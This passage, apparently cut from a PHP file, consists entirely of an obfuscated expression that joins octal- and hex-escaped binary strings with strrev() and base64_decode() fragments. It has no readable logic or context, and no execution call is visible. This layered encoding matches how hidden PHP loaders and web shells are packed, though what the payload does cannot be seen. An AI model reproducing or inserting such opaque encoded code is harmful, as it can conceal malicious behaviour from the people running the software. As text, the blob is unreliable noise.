JY2o1ybygmVRkThMpe/5c0jnG')."\124\56\236\234\134\115\62\345\114\71\255\321\75\166\76\63\76\106\217\363\222\171\43\65\52\223\255\113\134\133\155\116\225\310\315\331\274\71\244\310\334\250\36\117\46\110\111\232\14\353\104\172\246\161\41\101\241"."\xbf\x85\x51\x2d\x5e\x4c\x52\xd4\xd1\x7c\x86\xdd\xc7\xea\x85\xa9\xb8\x92\x26\x45\xaf\x1e\x37\xf3\xfa\x4\xe9\xfa\x5\xf3\x49\x1b\x9a\xe7\x91\x86\x4f\xa5\xc1\xb6\xa5\x44\xe\x7e\x9b\x1b\x49\xff\x98\x7a\x4a\x8b\x67\xe9\x36\x32\x55"."\xca\xe5\xc7\x69\x35\x1a\x48\x9b\xe7\xcc\x21\xe3\x3d\xa7\x99\xf4\x56\x42\xd6\x8b\x53\x19\x32\x12\xf3\x9b\x28\x74\x3c\x17\x1f\xcb\x90\x1e\xc8\x4d\x14\x4a\xc5\xf1\x51\x5a\x7\x4a\x9\xb\x48\x60\x72\x22\x99\xca\x1a\xe4\xbc\x4a\x1d"."\xcd\x16\x26\x27\xc8\xc1\x6e\x66\xb5\x62\x14\x53\xa4\x7d\x13\xd9\x14\xa0\x6d\x52\xbb\x5c\x71\xb5\xae\xa5\x98\xea\x2d\xd8\xe7\x65\x49\x6b\x9a\xe6\x53\xda\x4d\x19\xa5\x31\xaa\x67\xbc\xa0\xb1\x81\xd6\x90\xfc\x36\xd2\xe\xcd\xc4\xc7"."\xd2\x25\x52\x39\x45\x4e\x68\x53\x49\x72\x95\x9a\x48\xa9\x60\x20\xe8\x8d\x44\x5a\x1f\x4f\x18\xa4\xb4\x44\x49\x1e\xd5\x72\x24\x65\x75\x6a\x22\x33\x4a\x95\x37\xe7\xd2\x8e\x1a\x9d\x9a\x50\xf4\x3c\x19\x80\x26\x3a\xd0\x45\x2d\x3e\x36"."\x41\xa9\x3e\xaf\xa6\x8b\xca\x4\x3d\xa9\x19\x9b\xd2\x53\xb9\x9\x4a\xa8\x4\x7f\x6c\x22\x1f\xd7\x33\xa4\x94\xe6\xe6\x5\x94\xcc\xc9\x80\x35\xce\x21\x5d\x98\x99\x2a\x4d\xea\x9\x72\xfc\x1\xca\x29\x8d\xc9\xe4\x23\x5a\x7a\x3c\x5f"."\x34\xa8\xce\x88\x9a\x33\xa6\x52\x84\x48\x57\xe7\xf5\x92\x9c\x99\xa2\x24\x42\x75\x94\x65\x6d\xbc\x90\x25\x5f\x1c\xd3\x32\xab\xb\xf4\x54\x6e\xde\x3c\xfa\x55\x3a\x13\x32\x69\x3\x4c\x0\x7a\xac\x90\x99\x2c\xe5\xa9\x65\x43\xe3\x2"."\72\323\50\155\315\247\3\0\276\237\36\215\123\345\247\122\146\154\112\43\144\62\167\301\134\112\144\224\332\346\223\57\311\331\114\241\230\42\231\346\323\271\60\232\236\232\54\321\323\201\171\163\111\356\5\115\344"."\113\215\215\124\255\75\61\225\322\46\115\72\241\347\322\146\320\257\120\46\231\312\253\143\172\221\220\102\43\305\113\252\245\251\11\306\167\224\261\114\62\116\46\331\30\144\24\32\345\62\13\110\51\13\51\177\220"."\x8b\x4a\xca\xa4\xb7\x5c\xe6\x84\x91\x19\x9f\xa4\x37\xf7\xaa\xac\xe8\xf4\xa8\x62\xfe\x5c\x9a\x91\xe4\x2b\x24\x27\xc7\x52\xa3\x4\x55\x9e\xca\xa8\x13\xa3\x64\x72\xcc\xa7\xe3\xdd\x4c\x9b\x46\x67\xf6\x1c\x3a\xb3\x9b\xe6\x93\xe\x57"."\306\306\345\364\44\275\23\62\314\261\251\64\341\316\313\351\352\320\51\47\106\351\341\266\141\312\146\321\260\41\320\331\223\20\125\74\107\25\205\352\62\122\155\111\176\33\155\24\221\206\61\115\347\307\32\360\74".strrev('¨ãÃ²’ÆÌô Î’ÜdŒLº ÚË¡¬ucãİ56Mz1á}<!v¡RYˆ2B›È›ˆ°Ñ†µ¸H').strrev('¨—ä-åRW¦1¡¡TÂ¢±”12™GıOy«.³g%šªb‚%Ôce7–>+t.#»EÄbbë').strrev('Í:Ö$Ãm;y£pÎÃpÎ‘Z…Ç©[X05f¼\\K­°…Fn`‰.Å†“AI'."\n".'Õ”AÖĞ±÷Œ')."\262\371\271\52\251\3\257\0\271\266\50\353\53\64\272\126\2\264\214\273\225\164\311\1\47\62\316\161\110\370\203\16\11\135\44\112\126\303\221\200\117\142\67\256\342\350\213\225\324\225\102\126\116\260\12\26\46"."\xa5\x94\xc\xb2\x26\x5b\xa4\x14\xa0\x77\x89\xea\x3d\x4b\xa6\x46\xc3\x62\xd5\xc4\x1b\x4d\x5b\x63\x2c\xf3\xc7\xde\x1c\x4b\x22\xe8\xf0\x22\xb3\xc9\x60\xd7\x29\xe2\xc9\x2b\xba\xd8\xe5\x75\xc6\x51\x76\x5d\x13\x6\x25\xb1\xb\x69\x5d".base64_decode('SapU6U7JIUzK69F1DNP2S2QVWbdcBUEVKqiJypWlYX15l8bkFFG+Dwg2N7G0YsYIgyIf7vSEA97Y')."\200\207\152\221\312\205\202\273\274\160\120\263\304\150\114\216\153\272\111\253\130\204\312\301\204\377\267\166\0\114\150\13\150\56\352\40\226\111\344\306\55\46\364\2\11\13\245\12\320\254\375\262\213\316\160\227\257"."\123\60\332\203\150\102\16\254\322\264\10\62\271\66\16\145\25\4\341\120\61\17\123\211\42\275\133\310\357\342\250\343\104\271\60\105\52\326\147\35\15\120\141\47\33\40\320\114\320\175\111\3\251\121\221\31\170"."\x3c\x21\xe\xc1\x10\x29\xc4\xc7\x16\x66\x47\x43\xfd\x2d\x59\x4d\xb1\xe9\x5\x30\x44\x79\xa6\x15\x65\x64\x65\x7a\x79\x66\x80\x71\x53\xf3\xa\xa3\x8a\xa2\xc1\xae\x0\x7a\x3\x9d\x31\x5f\x80\xd8\xb7\x41\x65\xc3\x58\x22\xab\x51\xfe"."\10\310\51\226\124\205\253\226\130\241\150\47\4\321\172\323\63\20\210\205\303\101\201\54\132\4\176\5\325\371\371\145\53\214\161\265\176\170\335\40\136\304\32\306\270\246\223\156\204\326\165\120\103\63\54\21\43"."\x1f\x30\xb2\xde\x1e\x4f\x88\x69\x61\xce\x75\x35\xb8\x1a\x39\x2e\xf8\x60\xc\x2a\xa3\xb6\x51\xa3\xa0\x70\xc4\x13\xaa\x60\x69\x89\x2d\x30\x49\xb7\x13\xab\x4b\x92\xa1\x27\x38\x24\x79\x83\xbd\x83\x7d\xfd\x61\x6c\x5a\x88\xe1\xfd\x41"."\41\35\351\332\131\222\105\60\51\326\77\320\353\361\372\245\100\177\44\110\225\150\231\56\61\122\237\16\263\70\155\272\156\50\314\262\222\344\307\21\121\305\133\54\221\225\104\150\165\330\121\35\255\212\326\105\153"."\xa2\xb5\xab\x5c\x51\x63\x84\x4c\xa9\x55\xe2\x88\x90\xd5\x64\xc0\x47\x5a\xd4\xc2\x42\x6c\x9\xea\xb\x87\x4f\x24\x6\x4\xc1\x90\xc7\xdb\x4b\x6b\x1\x66\x3e\x9\x6\xbd\x1\x1c\x78\xf7\xa7\xb7\xfe\xe9\xee\x73\xde\xbd\xf4\xe6\xed"."\147\234\15\12\332\161\311\251\73\56\334\362\247\73\317\176\357\207\367\156\277\371\254\167\357\73\147\307\117\157\331\161\326\51\244\352\357\335\362\353\77\335\173\377\273\77\275\176\373\315\27\355\270\340\256\167\57"."\71\15\47\274\177\303\255\333\317\274\236\125\114\172\377\274\373\166\234\163\355\216\363\67\355\70\373\346\355\167\237\267\375\67\247\156\277\363\116\7\310\375\376\372\263\337\275\367\346\35\77\272\140\307\325\47\357"."\xd8\xbc\x71\xc7\x65\x67\x6f\x3f\xf3\xe7\xdb\x2f\xbe\xfe\xdd\x73\x6e\xd9\x7e\xd5\xf\xb7\x6f\x38\xfb\xbd\x5b\xce\x3f\xde\x4e\x3b\x38\x3e\x4c\x47\x81\xdc\xa6\xbb\x57\x46\x8d\xba\x1a\xdc\xb3\x51\xa3\x1e\xf6\x6a\x2d\xf8\xad\x81\xea"."\270\340\227\152\41\2\212\13\103\133\232\176\257\337\256\336\56\106\211\105\152\35\46\12\110\323\114\236\60\210\105\53\215\307\220\305\103\365\264\265\130\113\206\136\250\224\120\31\237\77\354\15\5\72\375\104\341".strrev('0	('."\0".'Ë‚ªEñ"Áª^•T¬ª<¹‹e¡+²!¥’µÄv¡ªXÌ¤ÌÂÊZ4é.Hx¤,Ô'."\r".'“').strrev('Hj;$†˜Ãj'."\n".'ıâõ"­UT­CGF±-Äq,ùf(1RÅF çÈÄJÖ4phí^^«¥Ò"9 jÛ')."\x85\xc5\xea\x72\x5c\xc0\xa2\xc\x53\x97\x55\xc0\xb3\xa4\x84\x83\x81\x58\x7e\xf0\x6b\x31\x14\x4e\xb8\x78\xe\x3c\x4e\x0\xc3\xe\x93\x3c\xfd\x3e\x2b\x26\xb6\x2f\x1e\xa8\x96\xe4\x7c\x12\xa4\xe0\xfe\x15\x87\xb9\xba\x56\x8a\x13\x95"."\332\12\211\50\233\245\63\332\54\235\121\123\117\130\304\100\67\33\157\254\5\53\141\23\12\134\55\331\240\3\105\240\150\250\40\24\217\26\305\325\100\63\300\340\140\174\20\140\51\243\312\44\57\11\160\42\226"."\x40\x47\x10\xc2\xd9\x20\x56\x48\x43\x86\xdf\x55\x58\xb6\xc2\xed\xcc\x19\x69\xca\xe5\x88\xe5\x71\xdf\x72\xd6\x6\x4a\xcb\x64\x8\x14\x6e\x36\xe\x8d\x41\xfc\x11\x6f\xf\xa6\xf2\xb0\x40\xe6\xc9\xf8\x2c\xb\xa1\xf2\xee\x94\x2c\x24".base64_decode('kqWGggQPTxfIEPZBeIH+rmCoDxtBhL09/j6Pi/BvTAkYH4oRUptUDTkfBlVbuh99iHZZBH0VzKuY')."\251\30\46\356\205\102\232\124\206\214\276\204\254\334\144\224\245\255\32\133\157\222\42\231\227\203\140\50\22\3\35\100\330\263\300\165\253\205\205\102\324\47\55\352\172\211\155\375\320\366\101\220\124\344\172\56\346"."\50\111\302\34\123\162\2\354\354\250\55\163\234\36\54\200\52\300\57\173\203\375\135\1\152\25\342\213\133\322\174\241\0\64\267\44\225\223\150\11\61\256\65\0\42\205\361\44\13\163\123\76\230\300\226\175\20"."\341\253\76\114\21\74\67\300\317\204\373\131\230\313\162\40\2\25\373\70\7\36\362\261\160\17\63\350\202\11\301\220\20\361\204\74\175\141\26\15\15\1\216\16\141\202\341\122\237\47\34\1\255\352\37\354\343"."\x5c\xbf\xd7\xb3\x14\x10\x4c\x90\xcb\x25\x94\x63\xd7\xb8\xea\x3a\x6a\xa3\xd8\x2c\x3\x7\xf1\xcf\x62\x1a\x83\xaa\xed\x23\x6b\x1a\x1d\xd2\xbc\x75\xb5\x4\x87\x1a\x32\xc4\xcc\xc\x90\x81\x63\xfc\x2b\x27\xf6\xc6\x7a\x83\xdd\x38\x8e"."\x3c\x4a\xf8\xf3\x49\x2e\xfc\x4b\xc3\x12\x10\x47\x23\x5c\x1c\x35\xe8\xf2\xc5\x66\x84\x4\xe8\x58\xc2\xb6\x5e\x52\x7f\x70\xc8\xc3\xdd\x13\x8\x9\x18\x42\x4\x5e\x89\x3b\x2d\x70\xaf\x1c\x8e\x8e\x47\x5d\x40\x64\x30\x56\x71\x6b\xb"."\x5f\xa7\x44\x85\x11\x2f\x14\xe3\x89\x19\x0\xc9\xed\xa1\x2b\x2a\x5d\x3a\x1c\x24\x10\xcb\x6a\x69\x6a\x8b\xc\x58\x24\x15\x20\xf0\xef\x32\x1a\x40\xdc\x93\x64\x0\x5b\xc6\x42\x96\x5a\x5f\x60\xb3\x8f\x58\x74\x6d\x74\x76\xd4\xe9\xc2"."\226\56\120\222\211\72\170\315\142\376\145\140\325\15\207\55\146\72\61\144\256\117\112\7\155\46\41\74\217\161\244\225\374\220\255\106\53\351\11\22\155\157\143\103\353\77\161\155\77\370\353\216\254\365\203\277\136".base64_decode('8NMbAYOnMgQwSXsDS/xr4T88oVYSEQL9a8G/gMWsDfTbM3f6I0N+P0agYfLLUQHLIU0T/I2cEKRW').strrev('ÁC»Äƒ?ælæ¤\'(:¿ç/a<EY5cfz¦µªÌ-BA¹‹_R9Ï:ƒV,lı8Á"+¿¯RY').base64_decode('wQEh3uNZGujvpjF3HQ3VUat/XyAMushLaZC79RDjROREgpEo8loI2gd4O4gIgjjcAWDebJ1jnYOB')."\x5e\x9f\x68\x89\x8\x11\xc9\x92\x82\xf8\x3a\x59\x55\x66\xd1\xca\xd1\x38\xb2\x49\xa4\x11\xd8\xe5\x34\x8c\xc8\x8b\x46\x50\x1f\xd0\x8\xee\x0\x1a\x43\xdd\x45\x23\xc8\x7d\x8\x8d\xa0\x86\xd2\x8\xdc\x92\xf8\xfb\x69\x1a\xd8\xfa\x81".base64_decode('bRvdz6W5lmxGLjELm0XJuGA8azvtQqc4fjhuZJFAqmaSYMAHj82Egxf3quGoEQ2P1HWsomSIjcTM')."\210\152\62\243\77\364\21\342\151\3\174\44\200\154\164\204\317\220\365\233\237\314\130\367\70\214\127\254\142\133\27\142\116\353\40\277\72\257\234\125\11\20\102\310\210\35\200\177\242\4\67\112\266\55\304\202\246".base64_decode('2kEX1Bg3xjT1oqBxyrRBkRJcMQ5TxL5CB0Wg/6j9E1rKST1NTeJYViVWaniJnaTYNdREMFdy48eu').base64_decode('VFHbVHKWDIOC7ZOc5PY+MrNYMjPctkt0TOLrxL85qMAdVrLkhNoXR4p9XFWcdYchKPyhAyrePuwF')."\306\226\221\224\24\140\125\26\260\70\260\227\173\42\121\65\157\26\254\244\334\2\32\236\327\360\217\340\63\50\34\236\122\351\1\60\253\136\136\33\120\364\234\212\316\303\206\270\252\60\113\127\370\20\42\175\154"."\x76\xbe\x8e\xe\x26\xf3\x56\xff\x28\xc5\x3c\xf8\xc2\x0\x1b\x1d\x67\x23\x45\xa6\x17\x48\x88\x20\x24\x26\xe2\x30\xfd\x57\x30\x2c\x28\xaf\xa0\x4d\x89\xdc\xb3\x90\x62\xf5\x2c\xa6\x9a\xe3\x6d\x95\x33\x35\xad\x4f\xce\x4f\x46\xb4\xa5".base64_decode('qkJuOHzBof7eIHXKQP2wkDlPro7AZkJ30YhJA5WbpMukPkN0pUBEzL1uHS/SCBpsTm2ekLcHiHax')."\xae\x0\x90\x7b\xfd\xcb\x88\xf8\xb4\x24\xe8\x8b\x85\x83\x83\x21\x7a\x12\x1\xe3\xc8\xb6\x22\xe4\xf7\x2e\x67\x27\x3\xc\xda\xe5\x59\x6a\x87\xc0\xe2\x22\x9e\xee\x8a\x60\x26\xd8\x41\x38\xe2\xa1\xb1\x50\x10\x4a\xc1\xfe\xde\x2e\x5b"."\206\160\17\163\356\141\205\305\172\3\375\113\52\46\104\202\261\76\41\13\6\202\275\160\237\35\146\55\41\354\207\135\301\343\235\275\101\257\220\34\10\226\367\4\140\334\66\40\26\223\351\342\132\23\135\203\316"."\x15\x5a\x3a\x6a\xa2\xc9\xb5\x70\xa9\x75\xc6\xc0\x4a\xdd\x11\x5d\x57\x5b\x13\x75\x77\xb8\xea\x98\x7c\x88\x87\x46\xb0\x24\xa8\xc\x56\x8d\x88\x85\xa1\xb9\x5d\x2e\x52\x0\xb\x0\xe9\x94\x19\x25\x53\x1a\x24\x6e\x82\xc2\xd8\x94\xd3"."\xf2\x5\xb2\xba\xaf\x13\xdc\x72\x40\x63\x15\x97\xdd\x8d\x47\x0\x9f\xf1\xc5\xc2\xcb\xc3\xac\x27\xb1\x45\x41\xa5\x74\xb\xed\x60\x34\xf1\xe4\xdb\x86\xc\xfe\x6\x44\xd4\x88\x92\x2b\x54\x44\xb4\x10\x9f\xc5\xd6\x42\x4\xb9\x54\x8d".base64_decode('91AYgUTjLozEMdaoWgudiYkitCfl/c1nMQARcwCmnLHcmXMmo5Fu6IUiuoJlUHXBDURCyyeR5wsy')."\x55\xe5\x4\xbd\xca\x29\x82\x6d\x19\x3d\xb7\x85\x8b\x85\xe1\x1c\x57\x69\x95\x66\x32\xf3\x51\x72\x1d\x13\x93\x91\xf1\x73\x4c\xbc\x2c\x1b\x73\x1a\x6a\x3a\xef\x94\xb3\x69\xd\xf0\xc4\x4c\x8e\x42\xe5\x51\x4b\x3a\x77\x21\x52\xd0\xc0".base64_decode('ppM6sXOCTwhpGBkUTtcBeDDMPK/AiMFi4khCymKXD2FUuxZpDnEn1AXWH0GpO1g0A9DDDLekghwK').base64_decode('+dUha6zE/Y5RQbQyU4W7TkFLnc7N3ChfR3Kj7BybLr90VSwpXcJlFd+OEpdgIK1zkt7/EJ3yzkmo')."\xf5\x5e\xb6\xf2\x40\x83\x27\xd1\x4f\x9a\x67\x28\x3c\xc7\xd9\xd3\xe7\xf1\x3a\x1\x87\x61\xa\x34\xcb\x73\x80\x4c\x7a\x54\x46\x24\xf2\xb8\x31\x27\x6\x1d\x9\x28\x74\x39\xac\x9f\x27\x65\x40\xaf\x92\xd1\x2f\x77\xc3\x32\xd3\xea\xec"."\7\3\261\227\20\40\340\45\341\141\77\135\152\61\324\106\25\30\310\345\11\34\307\326\347\364\276\52\43\263\12\303\146\340\120\245\357\56\253\370\335\145\225\276\273\314\366\335\145\345\337\305\40\33\365\311\205".base64_decode('ghe7CBPnrAWUECOU+aXgbYZ4JUIEV3yd7QLJPtWAonCS4Rs8xCg8JdC+pbh/67BHotyYFQTlIcRR').base64_decode('MWQWUToA4pAJJQK+54cWln1MCtEpZbs1w6hwzwagEr6IKWJ+IyHRUIEuEFVDkuN5Tc/RsSH+j5gr').strrev('ÌæÚÔ„ÊiGÖRºô.dò5¦`æùIJDPÍü£¤cd'."\n".'ÂV“Ây>É£3ö*[ÁÃ{†èæ').base64_decode('x1CUUSqwCUIzE5QHmJMee91gDzpzFo9l1H+Q6G1BtRitco6nc3dN6DTOWRHgFEzTMHsQ3OWBhqTZ')."\150\70\311\204\316\240\236\241\127\145\370\147\105\245\352\71\165\356\170\51\30\16\143\47\162\113\224\111\352\302\310\66\45\154\136\217\242\335\321\276\150\104\354\127\123\227\123\51\120\155\301\121\212\245\56\340\33"."\22\155\372\364\36\232\310\256\162\166\105\237\114\44\21\371\11\163\353\350\22\331\61\36\143\224\212\34\127\126\240\125\4\377\317\251\125\44\31\50\247\322\31\312\357\254\13\105\301\367\52\226\211\7\220\233\55".base64_decode('ylSEHQFyb0VcyDF/U6Bb851akiyGa6oAvVa1VM2sAb+1VY4qKPygOBxhCEDfrmqZWYMCtcSyc4qo')."\x44\x9\xfe\x62\xf8\xa9\x27\x91\xf5\x3b\x64\xd3\x14\x76\xeb\x1d\xa8\xef\xe0\xc4\x6f\x72\x37\xb9\xc7\x9\x8f\xe9\x18\x83\x5f\xe4\xce\x20\xed\xb\xc6\x44\xc\xf0\x48\x7a\xb\x1b\x13\x39\x35\x59\x3\xc8\x18\x89\x29\x3d\xac\x26\x94"."\x87\xf7\xf9\xe6\x52\x96\xeb\xe9\x5b\xe1\xe4\x1e\x9c\x5a\x3b\x26\x72\x59\x89\x78\x5c\x6a\xab\x6e\x74\x35\x54\x4b\xd4\x3b\x68\x5b\xf5\x60\xa4\xcb\xb9\xa0\xba\xa3\x7d\xdf\x56\x2f\x3a\xb6\x33\x95\x3e\x78\xee\x6\xbd\x67\x61\x57\x99".base64_decode('7WQL3wrnKou4rbHp8hLel5OntDxYF8HON+dKkM4s/jc8jvvlyivmuKaT00smtFGdPoFx5QwyfbGN').strrev('Š‘ÑÁLO¢H¶İˆ<rÎ,q³B¯‘|V©Câ°ilAiRÓ¼±89 ^æ,˜X4= ,<j')."\170\236\323\155\52\201\101\56\114\101\252\350\66\212\116\214\305\266\372\302\321\160\2\271\15\116\21\60\113\301\162\156\52\225\120\110\163\245\212\235\40\331\173\1\145\201\343\357\24\235\72\116\70\213\50\71\257".base64_decode('TJhOSAJOqsZXnsLnesWqJgg1VUIZLKpJ+yfRSbGzWKQfrFio6C6VIqBGBJLTNRxDLbK8DCiAie/2')."\xed\x80\x70\xa2\x53\xee\x32\xe\xcc\x7a\xa9\xa9\xb9\x65\xee\x42\xf0\x3f\xe1\xc2\xf4\xf8\xbb\x58\x30\xdb\x58\x90\xba\x94\x3b\xde\x9d\xa2\xc\x84\xbb\x78\xa4\x2d\x86\x63\x6e\xf1\xa3\x27\x80\x79\xe7\x32\xd6\x40\x39\x8f\x5\x8f\xd7"."\xd6\xe2\xe6\x93\x34\x14\x6f\x26\x5\xef\x81\x15\x38\x6d\x52\x29\xd1\x55\x98\x2c\xc2\x82\x2e\x10\x1b\x8d\x34\xd\xe8\xc\x5f\xe6\x93\x21\x9e\x1d\xe5\x15\x8e\xc3\xeb\x2c\x42\xcb\xa3\xa0\x3e\x1a\x97\xd9\xd0\x72\x2d\x30\xfe\x44\xa6"."\230\37\155\23\22\45\123\323\244\234\234\237\44\273\211\131\106\313\54\3\153\4\315\162\315\111\31\40\102\144\216\154\221\271\216\54\240\60\371\306\100\357\140\167\240\137\270\162\22\0\61\257\257\77\346\31\30"."\xa8\x98\xc0\xe4\x1b\x53\x4d\xb8\xa1\xab\x4a\xd7\x6a\xea\xaf\x38\x41\x87\xbf\x55\xcd\xa5\xa5\x4\x3c\x26\x6b\xab\x82\xd0\x2a\xc9\xd0\x13\xd4\x3d\x50\x95\x9b\x70\x4a\x84\xc0\x77\x50\xad\x2a\xc9\x52\xd\xb3\x48\x29\x30\x9e\x4e\x14"."\302\311\325\355\255\156\265\235\162\123\260\141\201\144\27\322\250\264\312\366\61\45\166\66\125\361\320\315\223\260\71\157\364\312\371\245\345\131\140\341\256\104\245\44\67\72\164\162\13\116\77\311\46\134\324\372\261"."\xf8\xee\xb0\x9e\x4d\xb2\x13\xaf\xa\x83\x52\x90\x13\xa3\x50\xb8\xe7\xc\x12\x27\xbb\x48\xc2\x0\xdc\x27\xe0\x4\x8b\x53\x41\x53\x38\xde\x6\x15\x7\x9f\x82\xfb\x44\x5d\x4d\x67\xe8\x9\xc9\x1a\x5c\x10\x5c\x49\xd7\xad\x2b\x87\x91"."\x1b\x71\x7b\x92\xa7\xa0\xda\x41\x70\xbc\xec\x30\xb8\xd5\xe5\x30\xc0\xe9\xad\x9f\xc1\xb4\x22\x22\x71\x8\xc5\xe9\xed\xef\x1e\xa6\xfa\x24\x28\x16\x1d\xae\x76\xd5\xad\x5b\xe7\x56\xe9\x45\x50\xb4\x8a\xe2\xe2\x75\xd4\xc5\xb0\x71\x3c"."\352\262\342\203\312\221\336\144\210\4\140\307\304\122\327\11\204\212\367\165\327\161\245\112\166\341\43\301\133\240\266\266\366\141\166\22\71\102\323\250\274\244\66\56\240\343\70\225\161\106\206\130\320\333\317\345\107"."\x46\xb9\x78\x62\xba\x90\x8e\xa1\xc7\xea\x5c\xa9\xa3\xc4\xdc\x78\xe2\x8e\x12\xc3\x9e\x42\x41\x8c\xd2\xa7\x6\xa0\x93\x16\x77\x56\x8d\xbb\xd9\xb4\x71\x23\x98\x2b\xc1\x95\x38\x29\xa\x9a\xb4\x36\x38\xbc\xad\xb1\x25\x40\xa5\x48\x4".strrev('%t•§!ZUyË2ã‚`Ur7!Wg]D•J1’\\µuxä*úó±á2Ó«¡#Vd, áÛV>.').strrev(':—ä%s;üJÆbÑåş`š"<0q"¶™êÀ57LzÌœ™²‰*Æ@Gâ¹A'."\0".'Ïädkª…VÛ')."\x64\x36\xa4\xee\x82\x58\x9\x3a\x9b\x4e\xf1\xe3\x21\xe2\xcc\x79\x20\x14\x8c\x4\xbd\xd4\x89\x6d\xa5\x73\xa4\x39\x54\x8e\x33\xb0\x7a\x2c\xdf\x6\x50\x4d\xc4\x25\xfe\xe5\x56\xc\xb6\x6\xba\x9\x84\xc\xbf\x5e\xcc\xe7\xd9\x9d\x1a"."\24\315\102\105\346\342\17\372\122\10\147\212\46\367\350\4\75\316\105\240\302\271\101\300\202\23\17\350\102\104\111\272\350\222\307\234\311\20\170\205\34\370\124\22\226\107\247\203\340\140\223\176\51\253\121\57\46"."\115\15\15\15\316\206\106\360\77\273\225\40\237\150\241\166\134\2\112\103\103\13\372\237\110\25\360\224\222\164\250\65\5\314\137\312\113\10\302\70\330\214\223\20\101\121\363\105\52\3\200\376\102\16\104\132\350"."\x44\x5f\x24\xec\x6b\x16\x49\xa\x6c\x1d\x89\x29\xf6\x96\xf6\x52\x6b\x14\x32\x4\x94\xcb\xc3\x99\x4d\xc3\x60\x21\x6\xc3\x81\x5a\x4e\x7b\x92\x5e\x26\x2\x34\x3e\xd0\xa0\x1e\xfe\x7c\x92\x88\xd7\x8b\xb0\xe\x76\x9b\xf8\x31\x17\xed"."\101\21\50\236\0\233\54\315\362\175\0\5\113\136\202\125\35\2\204\335\76\24\24\4\17\52\60\52\136\321\241\144\246\177\213\142\131\146\323\1\243\375\254\244\112\44\224\321\306\143\174\5\203\321\23\130\14"."\365\11\224\316\51\261\260\326\223\216\241\214\217\22\7\275\262\42\327\105\310\120\142\124\315\132\264\360\143\102\331\242\233\105\300\137\240\30\107\207\25\237\70\223\17\100\217\45\56\336\173\310\61\27\162\267\217"."\x6f\x9c\x5b\xf6\x15\x7a\x52\xd7\xb8\x2e\x7c\xd9\xf3\x11\x34\x16\xae\x7c\x4d\x2a\x1c\x4\x51\xd8\x34\x98\xec\x9c\x88\x42\xfc\x14\x80\x2f\x32\xbd\xcc\xcd\x88\x50\x80\x3d\xc9\x96\xc7\x93\x14\x5e\x49\x30\xb8\x7f\x11\x2f\xf3\x57\x24"."\72\35\301\36\125\204\113\101\203\170\303\343\236\214\150\31\254\365\105\75\353\52\350\132\32\214\204\41\324\13\302\7\52\203\31\172\71\146\5\44\326\40\21\117\4\302\353\175\352\240\237\20\25\73\322\6\173".strrev('­xVH7âm€'."\n".'óUAsÅwnüé&JÛî(¥j>Å—aAò%J2ğH^ªõ Á“0ÔÆ ')."\20\72\157\43\4\376\307\15\347\322\300\171\204\103\240\352\262\263\27\361\144\261\302\10\132\107\251\154\70\20\135\367\300\233\25\66\223\205\30\272\135\166\41\67\174\134\144\265\105\355\67\320\210\107\231\224\315"."\120\17\142\171\346\252\27\66\25\163\155\34\257\360\5\222\211\145\161\321\13\151\127\42\225\266\201\30\141\224\1\24\56\235\43\125\114\40\62\122\336\326\247\115\1\336\43\273\347\272\32\244\232\41\25\310\105".base64_decode('44bUH5HmuZoWSUPBoXlzaiUgoWWVISW+RDXdc5vnu5rnSTVLeiJ9vQ4JGs9I3UDi02olb0bXcoq7').base64_decode('aT7U/58zt9m1cI4UllOyrpJchMMR3cVx8gsfe4oJVY4J20S8SOMwujaH1CcJCPiGiNxDDcOiiCoe').base64_decode('IHH0jJRYGiqB6NyIe1GIayUOa7EQYYTjSvDNGMvV13EbKXsGc4jPRcjrBfqDUUZtUEk5Kz6+M6Qm')."\xd9\xc5\xf1\x70\xd4\x18\xa9\x8b\xba\xfb\x94\xa4\x2a\x77\x6a\x13\x38\x3a\x8c\x7e\x90\x1e\x23\x54\xa\xab\x85\xd1\xfa\xff\x26\x5a\x17\x1d\xa1\x4a\x44\xf0\x83\x3d\xa\xdf\x4d\xb9\x67\xd\xf8\xba\x9c\x1c\x9d\xed\xde\x90\xaf\x5e\xee"."\161\232\124\14\71\37\344\137\240\345\323\322\43\366\315\33\16\143\107\374\70\354\205\243\0\326\174\37\133\332\0\303\346\21\64\110\26\134\246\103\242\153\311\142\202\26\71\140\211\25\222\251\245\342\46\322\107"."\xe6\x15\x92\xb2\xc4\x67\x73\x26\x80\x98\xcd\x5a\xa4\x47\xf3\x23\x68\xee\x43\x28\x6a\x7\x86\xd5\x59\xda\x86\x61\xf5\xb3\x66\xf9\x83\x5d\x4c\x79\x90\x63\x4c\x34\x35\x8c\x58\x63\x1d\x35\xc3\xf9\xd4\x48\x47\x6d\xd\xcc\xb8\x96\xc0"."\160\51\264\173\251\111\227\245\52\342\127\55\335\133\257\305\127\273\125\262\303\163\23\372\101\165\153\155\255\161\325\325\266\267\363\15\240\33\22\241\245\4\126\147\350\162\261\274\154\113\44\104\221\165\346\236\321"."\15\44\11\175\262\360\37\347\124\60\72\311\14\257\330\376\323\234\356\200\217\164\370\360\10\16\264\202\76\131\331\76\122\127\73\334\136\1\302\362\15\350\112\251\142\223\101\277\261\361\216\222\307\237\242\104\126".base64_decode('j9I3oYhKXJToxFH1NabORptSE41Gk8g9NlM9JhDmUb1mBog3iRgYQBFmULzWYdmZQnVtB8hMI7XV')."\125\327\76\223\146\106\307\377\224\100\16\330\227\132\17\365\324\261\257\117\164\371\301\37\43\312\331\244\170\164\63\100\220\1\253\166\372\373\43\201\110\300\117\124\256\167\331\147\337\375\17\40\175\100\324\33\17".base64_decode('2JcWCTo3OtHQAP4Wgj8Z/CXAXxKScNQA/y4AfyClGUCblejE3Dj4A6nzwe98iJUCf3M5F2lv5wWD')."\326\172\234\135\240\331\225\12\7\131\332\31\205\13\25\204\273\365\370\152\312\67\351\241\2\174\175\100\221\351\34\222\263\164\311\24\137\246\202\237\214\352\160\336\301\131\307\247\107\15\264\337\103\170\160\266\126"."\xa8\x9\xc7\x65\x98\x96\x46\x4c\x47\xc3\x83\xff\x1e\x4b\x9c\xc6\xac\x59\xf5\x4e\x57\x43\x63\x53\xf3\x9c\xb9\xf3\xe6\x2f\x20\xe7\xcb\xf9\x62\x4e\xd1\xe9\x51\x89\x1b\xf9\x26\x6c\x86\x3f\x6a\x92\xfe\xf0\x43\x18\xeb\x69\x6b\xc1\xa0".base64_decode('xuw5ZicOeCOVBQQVGkNUOhpVJvvoyQJcKlPwAoe6EOgcIJTjjg5DbhOllAjdswpqLCQWzlBf+bMa').strrev('D'."\n".'‰Æ|8¢&œ-”(–`áFKâğÀˆZ¼",WšBêÕ¨›A$E?Ô%ÃiIÊŒ